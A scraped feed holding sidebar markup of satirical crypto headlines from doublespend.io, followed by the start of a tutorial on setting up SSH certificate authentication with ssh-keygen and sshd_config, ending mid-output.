				PayPal CEO Praises Regulatory Scenario In Crypto			</a>
		</h3>
		<div><p><span><a href="https://doublespend.io/2020/10/28/kayaking-adventurous-sport/" title="4:20 am" rel="bookmark"><i></i> <time datetime="2020-10-28T04:20:23+00:00">October 28, 2020</time><time datetime="2020-10-29T19:53:46+00:00">October 29, 2020</time></a></span>
		<span>
			<span>
				<i></i>
				<a href="https://doublespend.io/author/p2pai/" title="p2pai">
					p2pai				</a>
			</span>
		</span>

					<span>
				<i></i><a href="https://doublespend.io/2020/10/28/kayaking-adventurous-sport/#respond">0</a>			</span>
		
		</p></div>
									</div>

			</div>
			</div></section>		</div>

		<div>
			<section id="colormag_featured_posts_vertical_widget-7">
		<div>
			<div>
				<figure><a href="https://doublespend.io/2020/10/27/its-official-ohios-basket-building-is-smaller-than-tushar-jains-arweave-bag/" title="Is This Building Bigger Than Tushar Jain’s Arweave Bag?"><img width="390" height="205" src="https://doublespend.io/wp-content/uploads/2020/10/Bigbag-390x205.jpg" alt="Is This Building Bigger Than Tushar Jain’s Arweave Bag?" loading="lazy" title="Is This Building Bigger Than Tushar Jain’s Arweave Bag?"></a></figure>
				<div>
					<div><p><span><a href="https://doublespend.io/category/analysis/" rel="category tag">Analysis</a>&nbsp;<a href="https://doublespend.io/category/people/" rel="category tag">People</a>&nbsp;</span></p></div>		<h3>
			<a href="https://doublespend.io/2020/10/27/its-official-ohios-basket-building-is-smaller-than-tushar-jains-arweave-bag/" title="Is This Building Bigger Than Tushar Jain’s Arweave Bag?">
				Is This Building Bigger Than Tushar Jain’s Arweave Bag?			</a>
		</h3>
		<div><p><span><a href="https://doublespend.io/2020/10/27/its-official-ohios-basket-building-is-smaller-than-tushar-jains-arweave-bag/" title="6:15 am" rel="bookmark"><i></i> <time datetime="2020-10-27T06:15:00+00:00">October 27, 2020</time><time datetime="2020-10-29T16:41:06+00:00">October 29, 2020</time></a></span>
		<span>
			<span>
				<i></i>
				<a href="https://doublespend.io/author/nakaboto/" title="Sat Nakaboto">
					Sat Nakaboto				</a>
			</span>
		</span>

					<span>
				<i></i><a href="https://doublespend.io/2020/10/27/its-official-ohios-basket-building-is-smaller-than-tushar-jains-arweave-bag/#respond">0</a>			</span>
		
		</p></div>
											<p>While decentralized storage is indeed a huge space, the sheer size of Tushar’s bag has come as a surprise to many in the crypto space.</p>
									</div>

			</div>
			</div></section>		</div>
	</div>

	<div>
		
		<div id="primary">
			<div id="content">

										<div>
							<section id="colormag_featured_posts_vertical_widget-2">
		<h3><span>DoubleSpend Exclusives</span></h3><div>
			<div>
				<figure><a href="https://doublespend.io/2020/10/28/man-continues-reading-crypto-white-paper-after-first-mathematical-equation/" title="Man Continues Reading Crypto White Paper After First Math Equation"><img width="390" height="205" src="https://doublespend.io/wp-content/uploads/2020/10/comp-390x205.jpg" alt="Man Continues Reading Crypto White Paper After First Math Equation" loading="lazy" title="Man Continues Reading Crypto White Paper After First Math Equation"></a></figure>
				<div>
					<div><p><span><a href="https://doublespend.io/category/blockchain/" rel="category tag">Blockchain</a>&nbsp;<a href="https://doublespend.io/category/exclusives/" rel="category tag">Exclusives</a>&nbsp;</span></p></div>		<h3>
			<a href="https://doublespend.io/2020/10/28/man-continues-reading-crypto-white-paper-after-first-mathematical-equation/" title="Man Continues Reading Crypto White Paper After First Math Equation">
				Man Continues Reading Crypto White Paper After First Math Equation			</a>
		</h3>
		<div><p><span><a href="https://doublespend.io/2020/10/28/man-continues-reading-crypto-white-paper-after-first-mathematical-equation/" title="7:20 pm" rel="bookmark"><i></i> <time datetime="2020-10-28T19:20:55+00:00">October 28, 2020</time><time datetime="2020-10-31T03:20:59+00:00">October 31, 2020</time></a></span>
		<span>
			<span>
				<i></i>
				<a href="https://doublespend.io/author/nakaboto/" title="Sat Nakaboto">
					Sat Nakaboto				</a>
			</span>
		</span>

					<span>
				<i></i><a href="https://doublespend.io/2020/10/28/man-continues-reading-crypto-white-paper-after-first-mathematical-equation/#respond">0</a>			</span>
		
		</p></div>
											<p>The video footage has been analyzed with WebGazeAnalyzer.</p>
									</div>

			</div>
			</div><div>
			<div>
				<figure><a href="https://doublespend.io/2020/10/28/breakthrough-mathematicians-estimate-ethereum-2-0-launch-date/" title="Breakthrough: Mathematicians Estimate Ethereum 2.0 Launch Date"><img width="130" height="90" src="https://doublespend.io/wp-content/uploads/2020/10/eth2-130x90.jpg" alt="Breakthrough: Mathematicians Estimate Ethereum 2.0 Launch Date" loading="lazy" title="Breakthrough: Mathematicians Estimate Ethereum 2.0 Launch Date" srcset="https://doublespend.io/wp-content/uploads/2020/10/eth2-130x90.jpg 130w, https://doublespend.io/wp-content/uploads/2020/10/eth2-392x272.jpg 392w" sizes="(max-width: 130px) 100vw, 130px"></a></figure>
				<div>
					<div><p><span><a href="https://doublespend.io/category/blockchain/" rel="category tag">Blockchain</a>&nbsp;<a href="https://doublespend.io/category/exclusives/" rel="category tag">Exclusives</a>&nbsp;</span></p></div>		<h3>
			<a href="https://doublespend.io/2020/10/28/breakthrough-mathematicians-estimate-ethereum-2-0-launch-date/" title="Breakthrough: Mathematicians Estimate Ethereum 2.0 Launch Date">
				Breakthrough: Mathematicians Estimate Ethereum 2.0 Launch Date			</a>
		</h3>
		<div><p><span><a href="https://doublespend.io/2020/10/28/breakthrough-mathematicians-estimate-ethereum-2-0-launch-date/" title="6:25 am" rel="bookmark"><i></i> <time datetime="2020-10-28T06:25:21+00:00">October 28, 2020</time><time datetime="2020-10-31T03:23:07+00:00">October 31, 2020</time></a></span>
		<span>
			<span>
				<i></i>
				<a href="https://doublespend.io/author/nakaboto/" title="Sat Nakaboto">
					Sat Nakaboto				</a>
			</span>
		</span>

					<span>
				<i></i><a href="https://doublespend.io/2020/10/28/breakthrough-mathematicians-estimate-ethereum-2-0-launch-date/#respond">0</a>			</span>
		
		</p></div>
									</div>

			</div>
			
			<div>
				<figure><a href="https://doublespend.io/2020/10/28/coffee-is-health-food-myth-or-fact/" title="Crypto Executive Fired For Not Saying ‘Like The Internet’"><img width="130" height="90" src="https://doublespend.io/wp-content/uploads/2015/03/fired-130x90.jpg" alt="Crypto Executive Fired For Not Saying ‘Like The Internet’" loading="lazy" title="Crypto Executive Fired For Not Saying ‘Like The Internet’" srcset="https://doublespend.io/wp-content/uploads/2015/03/fired-130x90.jpg 130w, https://doublespend.io/wp-content/uploads/2015/03/fired-392x272.jpg 392w" sizes="(max-width: 130px) 100vw, 130px"></a></figure>
				<div>
					<div><p><span><a href="https://doublespend.io/category/exclusives/" rel="category tag">Exclusives</a>&nbsp;</span></p></div>		<h3>
			<a href="https://doublespend.io/2020/10/28/coffee-is-health-food-myth-or-fact/" title="Crypto Executive Fired For Not Saying ‘Like The Internet’">
				Crypto Executive Fired For Not Saying ‘Like The Internet’			</a>
		</h3>
		<div><p><span><a href="https://doublespend.io/2020/10/28/coffee-is-health-food-myth-or-fact/" title="5:33 am" rel="bookmark"><i></i> <time datetime="2020-10-28T05:33:52+00:00">October 28, 2020</time><time datetime="2020-10-28T20:11:55+00:00">October 28, 2020</time></a></span>
		<span>
			<span>
				<i></i>
				<a href="https://doublespend.io/author/nakaboto/" title="Sat Nakaboto">
					Sat Nakaboto				</a>
			</span>
		</span>

					<span>
				<i></i><a href="https://doublespend.io/2020/10/28/coffee-is-health-food-myth-or-fact/#respond">0</a>			</span>
		
		</p></div>
									</div>

			</div>
			
			<div>
				<figure><a href="https://doublespend.io/2020/10/28/destruction-in-montania/" title="“We Are All About DeePhi”: SupariCoin Founder"><img width="130" height="90" src="https://doublespend.io/wp-content/uploads/2015/03/Defi-130x90.jpg" alt="“We Are All About DeePhi”: SupariCoin Founder" loading="lazy" title="“We Are All About DeePhi”: SupariCoin Founder" srcset="https://doublespend.io/wp-content/uploads/2015/03/Defi-130x90.jpg 130w, https://doublespend.io/wp-content/uploads/2015/03/Defi-392x272.jpg 392w" sizes="(max-width: 130px) 100vw, 130px"></a></figure>
				<div>
					<div><p><span><a href="https://doublespend.io/category/defi/" rel="category tag">DeFi</a>&nbsp;<a href="https://doublespend.io/category/exclusives/" rel="category tag">Exclusives</a>&nbsp;</span></p></div>		<h3>
			<a href="https://doublespend.io/2020/10/28/destruction-in-montania/" title="“We Are All About DeePhi”: SupariCoin Founder">
				“We Are All About DeePhi”: SupariCoin Founder			</a>
		</h3>
		<div><p><span><a href="https://doublespend.io/2020/10/28/destruction-in-montania/" title="4:39 am" rel="bookmark"><i></i> <time datetime="2020-10-28T04:39:41+00:00">October 28, 2020</time><time datetime="2020-10-29T19:47:47+00:00">October 29, 2020</time></a></span>
		<span>
			<span>
				<i></i>
				<a href="https://doublespend.io/author/p2pai/" title="p2pai">
					p2pai				</a>
			</span>
		</span>

					<span>
				<i></i><a href="https://doublespend.io/2020/10/28/destruction-in-montania/#respond">0</a>			</span>
		
		</p></div>
									</div>

			</div>
			</div></section>						</div>

						<div>
							<section id="colormag_featured_posts_vertical_widget-3">
		<h3><span>Opinion</span></h3><div>
			<div>
				<figure><a href="https://doublespend.io/2020/10/29/fastest-plane-in-the-world/" title="Crypto Teams Should Refer To ‘Mainnet Launch’ As ‘Money Transfer’"><img width="390" height="205" src="https://doublespend.io/wp-content/uploads/2015/03/money-390x205.jpg" alt="Crypto Teams Should Refer To ‘Mainnet Launch’ As ‘Money Transfer’" loading="lazy" title="Crypto Teams Should Refer To ‘Mainnet Launch’ As ‘Money Transfer’"></a></figure>
				<div>
					<div><p><span><a href="https://doublespend.io/category/opinion/" rel="category tag">Opinion</a>&nbsp;</span></p></div>		<h3>
			<a href="https://doublespend.io/2020/10/29/fastest-plane-in-the-world/" title="Crypto Teams Should Refer To ‘Mainnet Launch’ As ‘Money Transfer’">
				Crypto Teams Should Refer To ‘Mainnet Launch’ As ‘Money Transfer’			</a>
		</h3>
		<div><p><span><a href="https://doublespend.io/2020/10/29/fastest-plane-in-the-world/" title="7:45 pm" rel="bookmark"><i></i> <time datetime="2020-10-29T19:45:32+00:00">October 29, 2020</time><time datetime="2020-10-30T06:21:43+00:00">October 30, 2020</time></a></span>
		<span>
			<span>
				<i></i>
				<a href="https://doublespend.io/author/p2pai/" title="p2pai">
					p2pai				</a>
			</span>
		</span>

					<span>
				<i></i><a href="https://doublespend.io/2020/10/29/fastest-plane-in-the-world/#respond">0</a>			</span>
		
		</p></div>
											<p>This will help address the criticism that the crypto industry uses language that is not understood by all.</p>
									</div>

			</div>
			</div><div>
			<div>
				<figure><a href="https://doublespend.io/2020/10/29/teens-use-apps-to-keep-secrets/" title="Ledger Should Open Up Its Crypto Holdings Dataset As Well"><img width="130" height="90" src="https://doublespend.io/wp-content/uploads/2015/03/ledger-130x90.jpg" alt="Ledger Should Open Up Its Crypto Holdings Dataset As Well" loading="lazy" title="Ledger Should Open Up Its Crypto Holdings Dataset As Well" srcset="https://doublespend.io/wp-content/uploads/2015/03/ledger-130x90.jpg 130w, https://doublespend.io/wp-content/uploads/2015/03/ledger-392x272.jpg 392w" sizes="(max-width: 130px) 100vw, 130px"></a></figure>
				<div>
					<div><p><span><a href="https://doublespend.io/category/gadgets/" rel="category tag">Gadgets</a>&nbsp;<a href="https://doublespend.io/category/opinion/" rel="category tag">Opinion</a>&nbsp;</span></p></div>		<h3>
			<a href="https://doublespend.io/2020/10/29/teens-use-apps-to-keep-secrets/" title="Ledger Should Open Up Its Crypto Holdings Dataset As Well">
				Ledger Should Open Up Its Crypto Holdings Dataset As Well			</a>
		</h3>
		<div><p><span><a href="https://doublespend.io/2020/10/29/teens-use-apps-to-keep-secrets/" title="5:19 pm" rel="bookmark"><i></i> <time datetime="2020-10-29T17:19:58+00:00">October 29, 2020</time><time datetime="2020-10-31T05:14:15+00:00">October 31, 2020</time></a></span>
		<span>
			<span>
				<i></i>
				<a href="https://doublespend.io/author/p2pai/" title="p2pai">
					p2pai				</a>
			</span>
		</span>

		
		</p></div>
									</div>

			</div>
			
			<div>
				<figure><a href="https://doublespend.io/2020/10/28/womens-relay-competition/" title="A Sprint Race Should Decide Which Bagholder Gets To Dump Coins First"><img width="130" height="90" src="https://doublespend.io/wp-content/uploads/2015/03/relay-race-655353_1280-130x90.jpg" alt="A Sprint Race Should Decide Which Bagholder Gets To Dump Coins First" loading="lazy" title="A Sprint Race Should Decide Which Bagholder Gets To Dump Coins First" srcset="https://doublespend.io/wp-content/uploads/2015/03/relay-race-655353_1280-130x90.jpg 130w, https://doublespend.io/wp-content/uploads/2015/03/relay-race-655353_1280-392x272.jpg 392w" sizes="(max-width: 130px) 100vw, 130px"></a></figure>
				<div>
					<div><p><span><a href="https://doublespend.io/category/markets/" rel="category tag">Markets</a>&nbsp;<a href="https://doublespend.io/category/opinion/" rel="category tag">Opinion</a>&nbsp;</span></p></div>		<h3>
			<a href="https://doublespend.io/2020/10/28/womens-relay-competition/" title="A Sprint Race Should Decide Which Bagholder Gets To Dump Coins First">
				A Sprint Race Should Decide Which Bagholder Gets To Dump Coins First			</a>
		</h3>
		<div><p><span><a href="https://doublespend.io/2020/10/28/womens-relay-competition/" title="7:57 pm" rel="bookmark"><i></i> <time datetime="2020-10-28T19:57:24+00:00">October 28, 2020</time><time datetime="2020-10-29T16:50:27+00:00">October 29, 2020</time></a></span>
		<span>
			<span>
				<i></i>
				<a href="https://doublespend.io/author/p2pai/" title="p2pai">
					p2pai				</a>
			</span>
		</span>

					<span>
				<i></i><a href="https://doublespend.io/2020/10/28/womens-relay-competition/#respond">0</a>			</span>
		
		</p></div>
									</div>

			</div>
			
			<div>
				<figure><a href="https://doublespend.io/2020/10/28/coinmarketcap-should-just-be-a-brain-chip-implant/" title="CoinMarketCap Should Just Be A Brain Chip Implant"><img width="130" height="90" src="https://doublespend.io/wp-content/uploads/2020/10/coinmarketcap-130x90.png" alt="CoinMarketCap Should Just Be A Brain Chip Implant" loading="lazy" title="CoinMarketCap Should Just Be A Brain Chip Implant" srcset="https://doublespend.io/wp-content/uploads/2020/10/coinmarketcap-130x90.png 130w, https://doublespend.io/wp-content/uploads/2020/10/coinmarketcap-392x272.png 392w" sizes="(max-width: 130px) 100vw, 130px"></a></figure>
				<div>
					<div><p><span><a href="https://doublespend.io/category/opinion/" rel="category tag">Opinion</a>&nbsp;</span></p></div>		<h3>
			<a href="https://doublespend.io/2020/10/28/coinmarketcap-should-just-be-a-brain-chip-implant/" title="CoinMarketCap Should Just Be A Brain Chip Implant">
				CoinMarketCap Should Just Be A Brain Chip Implant			</a>
		</h3>
		<div><p><span><a href="https://doublespend.io/2020/10/28/coinmarketcap-should-just-be-a-brain-chip-implant/" title="6:09 am" rel="bookmark"><i></i> <time datetime="2020-10-28T06:09:19+00:00">October 28, 2020</time><time datetime="2020-10-28T06:09:20+00:00">October 28, 2020</time></a></span>
		<span>
			<span>
				<i></i>
				<a href="https://doublespend.io/author/nakaboto/" title="Sat Nakaboto">
					Sat Nakaboto				</a>
			</span>
		</span>

					<span>
				<i></i><a href="https://doublespend.io/2020/10/28/coinmarketcap-should-just-be-a-brain-chip-implant/#respond">0</a>			</span>
		
		</p></div>
									</div>

			</div>
			</div></section>						</div>

						
						<section id="colormag_featured_posts_widget-2">
		<h3><span>The Future: A DoubleSpend Special</span></h3><div>
			<div>
				<figure><a href="https://doublespend.io/2020/10/31/man-refuses-to-do-anything-quoting-navals-tweets/" title="Man Refuses To Do Anything, Says “I am following Naval’s Tweets”"><img width="390" height="205" src="https://doublespend.io/wp-content/uploads/2020/10/naval-390x205.jpg" alt="Man Refuses To Do Anything, Says “I am following Naval’s Tweets”" loading="lazy" title="Man Refuses To Do Anything, Says “I am following Naval’s Tweets”"></a></figure>
				<div>
					<div><p><span><a href="https://doublespend.io/category/future/" rel="category tag">Future</a>&nbsp;<a href="https://doublespend.io/category/people/" rel="category tag">People</a>&nbsp;</span></p></div>		<h3>
			<a href="https://doublespend.io/2020/10/31/man-refuses-to-do-anything-quoting-navals-tweets/" title="Man Refuses To Do Anything, Says “I am following Naval’s Tweets”">
				Man Refuses To Do Anything, Says “I am following Naval’s Tweets”			</a>
		</h3>
		<div><p><span><a href="https://doublespend.io/2020/10/31/man-refuses-to-do-anything-quoting-navals-tweets/" title="3:13 am" rel="bookmark"><i></i> <time datetime="2020-10-31T03:13:53+00:00">October 31, 2020</time><time datetime="2020-10-31T05:54:42+00:00">October 31, 2020</time></a></span>
		<span>
			<span>
				<i></i>
				<a href="https://doublespend.io/author/nakaboto/" title="Sat Nakaboto">
					Sat Nakaboto				</a>
			</span>
		</span>

		
		</p></div>
											<p>The man has reportedly set an aspirational rate of USD 1,000 per hour, following Naval’s advice.</p>
									</div>

			</div>
			</div><div>
			<div>
				<figure><a href="https://doublespend.io/2020/10/29/ancient-history-provides-clues-for-securing-crypto-keys/" title="Ancient History Provides Clues For Securing Crypto Keys"><img width="130" height="90" src="https://doublespend.io/wp-content/uploads/2020/10/ancient-130x90.jpg" alt="Ancient History Provides Clues For Securing Crypto Keys" loading="lazy" title="Ancient History Provides Clues For Securing Crypto Keys" srcset="https://doublespend.io/wp-content/uploads/2020/10/ancient-130x90.jpg 130w, https://doublespend.io/wp-content/uploads/2020/10/ancient-392x272.jpg 392w" sizes="(max-width: 130px) 100vw, 130px"></a></figure>
				<div>
					<div><p><span><a href="https://doublespend.io/category/future/" rel="category tag">Future</a>&nbsp;</span></p></div>		<h3>
			<a href="https://doublespend.io/2020/10/29/ancient-history-provides-clues-for-securing-crypto-keys/" title="Ancient History Provides Clues For Securing Crypto Keys">
				Ancient History Provides Clues For Securing Crypto Keys			</a>
		</h3>
		<div><p><span><a href="https://doublespend.io/2020/10/29/ancient-history-provides-clues-for-securing-crypto-keys/" title="8:27 pm" rel="bookmark"><i></i> <time datetime="2020-10-29T20:27:42+00:00">October 29, 2020</time><time datetime="2020-10-31T03:36:06+00:00">October 31, 2020</time></a></span>
		<span>
			<span>
				<i></i>
				<a href="https://doublespend.io/author/hoddler/" title="Matt Hoddler">
					Matt Hoddler				</a>
			</span>
		</span>

					<span>
				<i></i><a href="https://doublespend.io/2020/10/29/ancient-history-provides-clues-for-securing-crypto-keys/#respond">0</a>			</span>
		
		</p></div>
									</div>

			</div>
			
			<div>
				<figure><a href="https://doublespend.io/2020/10/29/million-dollar-hackathon-winner-vc-robot/" title="Million Dollar Hackathon Winner: ‘VC Robot’"><img width="130" height="90" src="https://doublespend.io/wp-content/uploads/2020/10/robot-130x90.jpg" alt="Million Dollar Hackathon Winner: ‘VC Robot’" loading="lazy" title="Million Dollar Hackathon Winner: ‘VC Robot’" srcset="https://doublespend.io/wp-content/uploads/2020/10/robot-130x90.jpg 130w, https://doublespend.io/wp-content/uploads/2020/10/robot-392x272.jpg 392w" sizes="(max-width: 130px) 100vw, 130px"></a></figure>
				<div>
					<div><p><span><a href="https://doublespend.io/category/future/" rel="category tag">Future</a>&nbsp;</span></p></div>		<h3>
			<a href="https://doublespend.io/2020/10/29/million-dollar-hackathon-winner-vc-robot/" title="Million Dollar Hackathon Winner: ‘VC Robot’">
				Million Dollar Hackathon Winner: ‘VC Robot’			</a>
		</h3>
		<div><p><span><a href="https://doublespend.io/2020/10/29/million-dollar-hackathon-winner-vc-robot/" title="8:05 pm" rel="bookmark"><i></i> <time datetime="2020-10-29T20:05:47+00:00">October 29, 2020</time><time datetime="2020-10-29T20:05:49+00:00">October 29, 2020</time></a></span>
		<span>
			<span>
				<i></i>
				<a href="https://doublespend.io/author/hoddler/" title="Matt Hoddler">
					Matt Hoddler				</a>
			</span>
		</span>

					<span>
				<i></i><a href="https://doublespend.io/2020/10/29/million-dollar-hackathon-winner-vc-robot/#respond">0</a>			</span>
		
		</p></div>
									</div>

			</div>
			
			<div>
				<figure><a href="https://doublespend.io/2015/03/24/mosquito-borne-diseases-has-threaten-world/" title="Jack Dorsey Founds Two More Companies, To Be CEO There As Well"><img width="130" height="90" src="https://doublespend.io/wp-content/uploads/2015/03/jack-130x90.jpg" alt="Jack Dorsey Founds Two More Companies, To Be CEO There As Well" loading="lazy" title="Jack Dorsey Founds Two More Companies, To Be CEO There As Well" srcset="https://doublespend.io/wp-content/uploads/2015/03/jack-130x90.jpg 130w, https://doublespend.io/wp-content/uploads/2015/03/jack-392x272.jpg 392w" sizes="(max-width: 130px) 100vw, 130px"></a></figure>
				<div>
					<div><p><span><a href="https://doublespend.io/category/exclusives/" rel="category tag">Exclusives</a>&nbsp;<a href="https://doublespend.io/category/future/" rel="category tag">Future</a>&nbsp;<a href="https://doublespend.io/category/news/" rel="category tag">News</a>&nbsp;</span></p></div>		<h3>
			<a href="https://doublespend.io/2015/03/24/mosquito-borne-diseases-has-threaten-world/" title="Jack Dorsey Founds Two More Companies, To Be CEO There As Well">
				Jack Dorsey Founds Two More Companies, To Be CEO There As Well			</a>
		</h3>
		<div><p><span><a href="https://doublespend.io/2015/03/24/mosquito-borne-diseases-has-threaten-world/" title="9:57 am" rel="bookmark"><i></i> <time datetime="2015-03-24T09:57:18+00:00">March 24, 2015</time><time datetime="2020-10-31T05:57:52+00:00">October 31, 2020</time></a></span>
		<span>
			<span>
				<i></i>
				<a href="https://doublespend.io/author/p2pai/" title="p2pai">
					p2pai				</a>
			</span>
		</span>

					<span>
				<i></i><a href="https://doublespend.io/2015/03/24/mosquito-borne-diseases-has-threaten-world/#respond">0</a>			</span>
		
		</p></div>
									</div>

			</div>
			</div></section>			</div>
		</div>

		

	</div>

		</div><!-- .inner-wrap -->
				</div></div>]]>
            </description>
            <link>http://doublespend.io/index.php</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948746</guid>
            <pubDate>Sat, 31 Oct 2020 02:43:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why every SSH user should switch to using SSH Certificates]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24948738">thread link</a>) | @dbsentry
<br/>
October 30, 2020 | https://keyper.dbsentry.com/post/sshca/ | <a href="https://web.archive.org/web/*/https://keyper.dbsentry.com/post/sshca/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The last few years have seen rapid automation of many Systems Administration/DevOps tasks. The new mantra is if you need to ssh to a server, your automation is not working right. But even for the occasional ssh access to the servers, the SSH authentication must be managed. Over the years, SSH has added many new features/techniques to enhance authentication and put some governance around it. This article is about the use of SSH Certificate-based authentication and why every organization, using SSH, must use it.</p><p>SSH Key-based authentication (aka passwordless login) has been with us for over two decades now. The mechanism works based on public-key cryptography. One adds his/her RSA/DSA key to the authorized_keys file on the server. The user with the corresponding private key can login without a password. It works great except for a few fundamental problems:</p><ol><li>When a user accesses the server using ssh for the first time, s/he always gets Trust On First Use (TOFU) warning.</li></ol><pre><code>$ ssh -l alice mavrix5.dbsentry.com
The authenticity of host 'mavrix5.dbsentry.com (72.191.40.116)' can't be established.
ECDSA key fingerprint is SHA256:PoK81UWgOBMn6owOoHXjGoBLWqcJ4E9JCiLQyiFF60s.
Are you sure you want to continue connecting (yes/no)? 
</code></pre><p>As the server is not trusted at this point, theoretically a man-in-the-middle attack could be launched. I tried to find damaging incidents of such attacks on the internet but could not find any. Nevertheless, the possibility exists and we’d be better off getting rid of this warning.</p><ol start="2"><li>When the number of servers increases, authorized_keys files proliferate and they are hard to manage. Moreover, once added they are active perpetually and have to be removed manually to block access to its corresponding private key. That is probably the reason why many security guys frown on the use of authorized_keys.</li></ol><p>Fortunately, the newer version of SSH included many improvements that give us the ability to centralize and better manage authorized_keys using <code>AuthorizedKeysCommand</code>. However, the TOFU remains. Although the solutions exist in either the use of SSHFP or SSH Certificates, their usage never caught on.</p><p>Having said that, in addition to taking care of TOFU, SSH Certificates have many more advantages/features (for e.g. certificate expiration, use of principals, etc) that enhance SSH authentication governance and should be used by all organizations that use SSH.</p><p>Instead of using complex X.509 style certificates, SSH chose to use their own simpler format of certificates, which can be easily managed using CLI <code>ssh-keygen</code>. In order to use SSH certificate-based authentication one needs to set up SSH Certificate Authority (CA). So, how does one set up SSH CA?</p><p>SSH Certificate authority can be setup on any computer with <code>ssh-keygen</code>. It is a key pair that is used to sign SSH Public Keys to generate certificates. It is recommended to set up two pairs of CA keys: one for host certificates and others for user’s certificates.</p><p>Use <code>ssh-keygen</code> to genearet CA Keys:</p><pre><code>$ ssh-keygen -t rsa -f ca_host_key
$ ssh-keygen -t rsa -f ca_user_key
</code></pre><p>The above would generate two pairs of SSH Keys. for e.g.</p><pre><code>$ ssh-keygen -t rsa -f ca_host_key
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ca_host_key.
Your public key has been saved in ca_host_key.pub.
The key fingerprint is:
SHA256:Epoq1Vy0/orivKOwxepBLqD7mGuaWbUKh+SoycMpKy0 manish@picanmix4
The key's randomart image is:
+---[RSA 2048]----+
|      .          |
|     . .         |
|      +          |
|   o = .         |
|.o. * o S        |
|O+ o . o         |
|X=B .   .        |
|E^=. . .         |
|^XB+. .          |
+----[SHA256]-----+
$ ssh-keygen -t rsa -f ca_user_key
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ca_user_key.
Your public key has been saved in ca_user_key.pub.
The key fingerprint is:
SHA256:9cW4eNS9mNUWWeSRDG9ONjMAWfOTpx9kuLfZyHEMAME manish@picanmix4
The key's randomart image is:
+---[RSA 2048]----+
|         .o+==o+*|
|          E. =**=|
|          . o.=/*|
|         . + o%=B|
|        S . ++o=o|
|           . ..==|
|              ooo|
|                 |
|                 |
+----[SHA256]-----+
$ ls -l
total 32
-rw-------  1 alice  staff  1823 Oct 30 13:19 ca_host_key
-rw-r--r--  1 alice  staff   398 Oct 30 13:19 ca_host_key.pub
-rw-------  1 alice  staff  1823 Oct 30 13:19 ca_user_key
-rw-r--r--  1 alice  staff   398 Oct 30 13:19 ca_user_key.pub
</code></pre><p>Optional: In addition you can also setup SSH Key Revocation List (KRL). This is a list of all revoked certificates.</p><pre><code>$ ssh-keygen -k -f ca_krl
</code></pre><p>And, thats it. your SSH CA is in business. Now, going forward, you just need to configure your servers and clients to use certificates with private keys.</p><h2 id="ssh-server-configuration">SSH Server Configuration</h2><p>Follow these steps to configure host to use SSH certificates:</p><ol><li>Copy your servers SSH Public Key, typically located under <code>/etc/ssh/ssh_host_rsa_key.pub</code> or <code>/etc/ssh/ssh_host_dsa_key.pub</code> and get it signed.</li></ol><pre><code>$ ssh-keygen -h -s ca_host_key -z &lt;serial no.&gt; -I &lt;hostname&gt; -V &lt;duration&gt; -n &lt;principal list&gt; ssh_host_rsa_key.pub
</code></pre><p>for e.g</p><pre><code>$ ssh-keygen -vvv -h -s ca_host_key -z 100 -I mavrix2 -V +52w -n mavrix2,mavrix2.dbsentry.com ssh_host_ed25519_key.pub
Signed host key ssh_host_ed25519_key-cert.pub: id "mavrix2" serial 100 for mavrix2,mavrix2.dbsentry.com valid from 2020-10-30T14:46:00 to 2021-10-29T14:47:02
</code></pre><ol start="2"><li>Copy the certifcate back to the host under <code>/etc/ssh</code></li><li>Copy CA User Public Key(<code>ca_user_key.pub</code>) to the host under <code>/etc/ssh</code></li><li>Add the following to <code>sshd_conf</code> file:</li></ol><pre><code>TrustedUserCAKeys /etc/ssh/ca_user_key.pub
HostCertificate /etc/ssh/ssh_host_ed25519_key-cert.pub
</code></pre><p><code>TrustedUserCAKeys</code> directs SSH to trust certificates signed by <code>ca_user_key</code>. And, <code>HostCertificate</code> directs SSH to send the host certificate instead of public key to the client.
5. Restart SSH</p><pre><code>$ sudo systemctl restart sshd
</code></pre><h2 id="ssh-client-configuration">SSH Client Configuration</h2><p>Follow the following steps to configure client/user to use SSH certificates:</p><ol><li>Copy user’s SSH Public Key (typically located under <code>&lt;usershome&gt;/.ssh/id_rsa.pub</code>. If not present, it can be generated using <code>ssh-keygen -t rsa</code>) to the CA host and get it signed</li></ol><pre><code>$ ssh-keygen -s ca_user_key -z &lt;serial no&gt; -I &lt;username&gt; -V &lt;duration&gt; -n &lt;principal list&gt; id_rsa.pub
</code></pre><p>for e.g</p><pre><code>$ ssh-keygen -s ca_user_key -z 100 -I alice -V +2h -n alice,apache id_rsa.pub
Signed user key id_rsa-cert.pub: id "alice" serial 100 for alice,apache valid from 2020-10-30T14:56:00 to 2020-10-30T16:57:51
</code></pre><p>You can look at the content of the certificate using the following command:</p><pre><code>$ ssh-keygen -L -f id_rsa-cert.pub 
id_rsa-cert.pub:
      Type: ssh-rsa-cert-v01@openssh.com user certificate
      Public key: RSA-CERT SHA256:2J9G7t6Dn11nKlI5l9USbHAFRTuBUUVxqbL+uHQaaDc
      Signing CA: RSA SHA256:X75sKpv1L2B6y/mIUYKZc0QVmQD8CgpcBS+ZhRPbRmk (using ssh-rsa)
      Key ID: "alice"
      Serial: 100
      Valid: from 2020-10-30T14:56:00 to 2020-10-30T16:57:51
      Principals: 
              alice
              apache
      Critical Options: (none)
      Extensions: 
              permit-X11-forwarding
              permit-agent-forwarding
              permit-port-forwarding
              permit-pty
              permit-user-rc
